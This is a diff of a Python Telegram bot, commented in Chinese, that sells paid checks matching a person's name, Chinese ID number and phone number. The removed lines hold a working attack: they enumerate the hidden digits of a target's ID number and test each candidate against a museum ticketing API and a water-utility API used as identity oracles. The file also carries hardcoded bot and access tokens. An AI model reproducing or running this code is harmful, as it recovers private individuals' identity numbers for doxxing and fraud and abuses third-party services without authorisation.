@@ -3,11 +3,6 @@ import requests
 import json
 import os
 import re
-import time
-import random
-import threading
-from datetime import date
-from concurrent.futures import ThreadPoolExecutor
 from telebot import types
 
 # 屏蔽 SSL 证书报警
@@ -19,27 +14,10 @@ API_TOKEN = '9262592175:AAGxl5ZK77A7trDhdr5Yh4AEgMQ-2J0aX28'
 ADMIN_ID = 6649617045 
 ADMIN_USERNAME = "@aaSm68"
 POINTS_FILE = 'points.json'
-TOKEN_FILE = 'token.txt'
 
 bot = telebot.TeleBot(API_TOKEN)
 user_points = {}
 user_states = {}
-success_list = []
-list_lock = threading.Lock()
-
-# --- 身份证合法性检查(精确算法) ---
-def is_valid_id_data(n):
-    if len(n) != 18: return False
-    try:
-        year, month, day = int(n[6:10]), int(n[10:12]), int(n[12:14])
-        if not (1950 <= year <= 2026 and 1 <= month <= 12 and 1 <= day <= 31): return False
-    except: return False
-    var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
-    var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
-    try:
-        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
-        return var_id[checksum] == n[17].upper()
-    except: return False
 
 # --- 数据持久化 ---
 def load_data():
@@ -58,15 +36,6 @@ def save_points():
     with open(POINTS_FILE, 'w') as f:
         json.dump({str(k): v for k, v in user_points.items()}, f)
 
-# --- 授权读取(用于第一轮接口: 博物馆) ---
-def get_auth_from_file():
-    if not os.path.exists(TOKEN_FILE):
-        with open(TOKEN_FILE, "w", encoding="utf-8") as f:
-            f.write("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjEzNDY1OTQyNzY4IiwicGhvbmVJbnZhbGlkIjowLCJuYW1lIjoiMTM0NjU5NDI3NjgiLCJjdXN0b21lcklkIjoiMjNmYTcwMzJiOTRjNDM5Y2E4OTMyMDI2ZjExZGUxNGEiLCJleHAiOjE3OTE1MzY5NjUsIm1kNSI6IjVGMTg3REU3RThEQ0ZCNDUwQTNCNkE5N0RFQjE3M0FBIn0.eBUingIkCJFQeuqjdVvf0Fc0RfGL26LdK_NVHIgvFdU")
-    with open(TOKEN_FILE, "r", encoding="utf-8") as f:
-        auth = f.read().strip()
-        return auth if auth and "请在此处" not in auth else None
-
 
 # ================= 2. 功能逻辑 =================
 
@@ -82,6 +51,7 @@ def query_3ys_logic(chat_id, name, id_card, phone, uid):
         save_points()
         
         raw_text = response.text.strip()
+        # 修正：严谨判断，必须包含成功/一致且不包含不一致/失败
         if ("一致" in raw_text or "成功" in raw_text) and "不一致" not in raw_text and "失败" not in raw_text:
             res_status = "三要素核验成功✅"
         else:
@@ -111,6 +81,7 @@ def single_verify_2ys(chat_id, name, id_card, uid):
         save_points()
         
         raw_text = response.text.strip()
+        # 修正：必须包含“一致”且绝不能包含“不一致”
         if "一致" in raw_text and "不一致" not in raw_text:
             status_title = "二要素核验一致✅"
         else:
@@ -128,130 +99,6 @@ def single_verify_2ys(chat_id, name, id_card, uid):
 
     except Exception as e: 
         bot.edit_message_text(f"❌ 请求异常: {str(e)}", chat_id, wait_msg.message_id)
-
-
-# --- 原版风格非库爆破与复核逻辑 ---
-def verify_museum(id_num, target_name, headers, url):
-    payload = {
-        "contactName": target_name,
-        "contactPhone": "15815067442",
-        "documentType": "RLY0101",
-        "documentNumber": id_num,
-        "isPartyMember": 0, "myself": 0
-    }
-    try:
-        response = requests.post(url, headers=headers, json=payload, timeout=8)
-        res_json = response.json()
-        if (res_json.get("code") == 200 and res_json.get("data") is True) or ("已存在" in res_json.get("msg", "")):
-            return True
-        return False
-    except: return False
-
-class KunmingWaterVerifier:
-    def __init__(self):
-        self.url = "https://km96106.cn/mpwxweb/business/authVerify.do"
-        self.headers = {
-            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781 NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254162e) XWEB/18151",
-            'dataSign': "",
-            'appid': "kmwater_2024031200",
-            'xweb_xhr': "1",
-            'devicetype': "phone",
-            'deviceid': "17685697269195111710",
-            'platform': "9",
-            'Access-Control-Allow-Headers': "x-requested-with,appid,platform,openid,accountid,deviceid,devicetype,preSign,kmwater-extservice-token",
-            'Sec-Fetch-Site': "cross-site",
-            'Sec-Fetch-Mode': "cors",
-            'Sec-Fetch-Dest': "empty",
-            'Referer': "https://servicewechat.com/wxe7e45324b93b190b/32/page-frame.html",
-            'Accept-Language': "zh-CN,zh;q=0.9"
-        }
-
-    def verify(self, name: str, card_no: str) -> bool:
-        payload = {
-            'type': "1",
-            'name': name.strip(),
-            'cardNo': card_no.strip()
-        }
-        try:
-            resp = requests.post(self.url, data=payload, headers=self.headers, timeout=10)
-            data = resp.json()
-            if data.get("data", {}).get("desc") == "验证通过":
-                return True
-            return False
-        except:
-            return False
-
-def verify_task(id_num, target_name, headers, url):
-    time.sleep(random.uniform(0.1, 0.4))
-    res = verify_museum(id_num, target_name, headers, url)
-    with list_lock:
-        if res:
-            success_list.append(id_num)
-            print(f"{target_name} {id_num} 越狱🟢")
-        else:
-            print(f"{target_name} {id_num} 越狱🔴")
-    time.sleep(0.5)
-
-def run_fk_process(chat_id, target_name, card_mask, gender, uid):
-    global success_list
-    success_list = []
-    
-    museum_url = "https://newticket.szmuseum.com/japi/sw-saas-cloud/customerContact/save"
-    auth_token = get_auth_from_file()
-    if not auth_token:
-        bot.send_message(chat_id, "❌ 未找到有效的 token 配置")
-        return
-
-    headers = {
-        "Host": "newticket.szmuseum.com",
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68 NetType/WIFI Language/zh_CN",
-        "AuthorizationC": auth_token,
-        "token": "f3Qu372W6kD3HJzZvKvqy9VNCBZX+/txdZA42yjgQQY=",
-        "appId": "9eadb789046543df8b229ae99bb6e8ec"
-    }
-
-    char_sets = [list("0123456789")] * 18
-    for i, ch in enumerate(card_mask):
-        if ch != 'x': char_sets[i] = [ch]
-        elif i == 17: char_sets[i] = list("0123456789X")
-        elif i == 16:
-            if gender == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
-            elif gender == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
-
-    valid_ids = ["".join(r) for r in itertools.product(*char_sets) if is_valid_id_data("".join(r))]
-    
-    if not valid_ids:
-        bot.send_message(chat_id, "❌ 没有符合条件的有效身份证组合。")
-        return
-
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        executor.map(lambda id_num: verify_task(id_num, target_name, headers, museum_url), valid_ids)
-
-    if success_list:
-        verified_final = None
-        water_verifier = KunmingWaterVerifier()
-        
-        for sid in success_list:
-            time.sleep(1.2)
-            if water_verifier.verify(target_name, sid):
-                verified_final = sid
-                break
-        
-        if verified_final:
-            final_msg = (
-                f"━━━ 一铭平安喜樂 ━━━\n"
-                f"━━━━━━━━━━━━━━\n"
-                f"✅ 匹配到身份证号: {target_name}-{verified_final} 验证成功\n"
-                f"<b>当前余额: {user_points[uid]:.2f} 积分</b>"
-            )
-            bot.send_message(chat_id, final_msg, parse_mode='HTML')
-            with open("success_log.txt", "w") as f: f.write(verified_final)
-        else:
-            bot.send_message(chat_id, "━━━ 一铭万事顺遂 ━━━\n━━━━━━━━━━━━━━\n❌ 遗憾, 初选中的号码均未通过终审。")
-    else:
-        bot.send_message(chat_id, "━━━ 一铭万事顺遂 ━━━\n━━━━━━━━━━━━━━\n❌ 核验结束, 未发现匹配结果。")
-
 
 # ================= 3. UI 菜单 =================
 
@@ -289,7 +136,7 @@ def get_main_text(source_user_id, source_first_name, source_username, pts):
 
 # ================= 4. 消息与回调处理 =================
 
-@bot.message_handler(commands=['start', '3ys', '2ys', 'fk', 'add', 'settoken'])
+@bot.message_handler(commands=['start', '3ys', '2ys', 'add'])
 def handle_commands(message):
     uid, chat_id = message.from_user.id, message.chat.id
     cmd_parts = message.text.split()
@@ -307,37 +154,6 @@ def handle_commands(message):
     elif cmd == '3ys':
         if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
         bot.send_message(chat_id, "请输入:姓名 身份证 手机号"); user_states[chat_id] = {'step': 'v_3ys'}
-    elif cmd == 'fk':
-        if current_pts < 1.0:
-            return bot.send_message(chat_id, "<b>❌ 积分不足 1.0，请先充值后再使用非库查询！</b>", parse_mode='HTML')
-        
-        if len(cmd_parts) < 4:
-            return bot.send_message(chat_id, "<b>❌ 格式错误！\n正确格式:</b> <code>/fk 姓名 身份证掩码 性别</code>\n例如: <code>/fk 杨志强 41152420020529xxxx 男</code>", parse_mode='HTML')
-        
-        target_name = cmd_parts[1]
-        card_mask = cmd_parts[2].lower()
-        gender = cmd_parts[3]
-        
-        user_points[uid] -= 1.0
-        save_points()
-        
-        bot.send_message(chat_id, f"✅ 已扣除 1 积分，正在后台开始非库检索...")
-        threading.Thread(target=run_fk_process, args=(chat_id, target_name, card_mask, gender, uid)).start()
-
-    elif cmd == 'settoken':
-        if uid == ADMIN_ID:
-            if len(cmd_parts) < 2:
-                return bot.reply_to(message, "❌ 格式错误！正确用法: /settoken <新Token内容>")
-            new_token = cmd_parts[1]
-            try:
-                with open(TOKEN_FILE, "w", encoding="utf-8") as f:
-                    f.write(new_token)
-                bot.reply_to(message, "✅ Token 更新成功并已保存！")
-            except Exception as e:
-                bot.reply_to(message, f"❌ 保存 Token 失败: {e}")
-        else:
-            bot.reply_to(message, "⛔ 您没有权限执行此命令！")
-
     elif cmd == 'add':
         if uid == ADMIN_ID:
             try:
@@ -355,22 +171,6 @@ def handle_all_text(message):
     if text.startswith('/'): return
     current_pts = user_points.get(uid, 0.0)
     
-    # 兼容直接输入：姓名 身份证掩码 性别
-    parts = text.split()
-    if len(parts) == 3 and ('x' in parts[1].lower() or len(parts[1]) == 18):
-        if current_pts < 1.0:
-            return bot.send_message(chat_id, "<b>❌ 积分不足 1.0，请先充值！</b>", parse_mode='HTML')
-        
-        target_name = parts[0]
-        card_mask = parts[1].lower()
-        gender = parts[2]
-        
-        user_points[uid] -= 1.0
-        save_points()
-        bot.send_message(chat_id, f"✅ 已扣除 1 积分，正在后台开始非库检索...")
-        threading.Thread(target=run_fk_process, args=(chat_id, target_name, card_mask, gender, uid)).start()
-        return
-
     parts = re.split(r'[,,\s\n]+', text)
     
     if len(parts) >= 3:
@@ -410,7 +210,6 @@ def handle_callback(call):
     
     try:
         if call.data == "view_help":
-            # 使用帮助文字严格保持原样，只在最后一行按要求追加了 /fk 说明
             help_text = (
                 "<b>🛠️ 使用帮助</b>\n"
                 "<b>名字-身份证核验 (企业级)</b>\n"
@@ -421,11 +220,7 @@ def handle_callback(call):
                 "<b>名字-手机号-身份证核验 (企业级)</b>\n"
                 "<b>全天 24h 秒出 毫秒级响应</b>\n"
                 "<b>发送 /3ys 进行核验</b>\n"
-                "<b>每次核验扣除 0.05 积分</b>\n"
-                "<b>——————————————————</b>\n"
-                "<b>非库身份证模糊匹配</b>\n"
-                "<b>发送 /fk 姓名 身份证掩码 性别</b>\n"
-                "<b>每次查询扣除 1 积分</b>"
+                "<b>每次核验扣除 0.05 积分</b>"
             )
             bot.edit_message_text(help_text, chat_id, message_id, reply_markup=get_help_markup(), parse_mode='HTML')
         elif call.data == "view_pay":
@@ -443,4 +238,4 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"清除 webhook 警告: {e}")
         
-    bot.infinity_polling(timeout=10, long_polling_timeout=5, interval=1)
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)
